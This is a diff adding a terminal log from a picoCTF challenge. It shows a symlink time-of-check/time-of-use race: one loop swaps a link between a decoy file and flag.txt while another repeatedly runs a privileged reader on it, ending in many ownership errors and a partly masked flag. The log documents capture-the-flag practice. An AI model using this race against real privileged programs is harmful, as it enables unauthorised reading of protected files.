@@ -1,0 +1,48 @@
+ctf-player@pico-chall$ touch random.txt
+ctf-player@pico-chall$ cat link.sh
+while true
+do
+ln -sf random.txt file.txt
+ln -sf flag.txt file.txt
+done
+ctf-player@pico-chall$ nano execute.sh
+ctf-player@pico-chall$ cat execute.sh
+while true
+do
+./txtreader file.txt
+done
+ctf-player@pico-chall$ chmod +x execute.sh link.sh
+ctf-player@pico-chall$ ./link.sh &
+[1] 45
+ctf-player@pico-chall$ ./execute.sh &
+[2] 2889
+ctf-player@pico-chall$ Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+picoCTF{******_3a5y_5748402c}
+
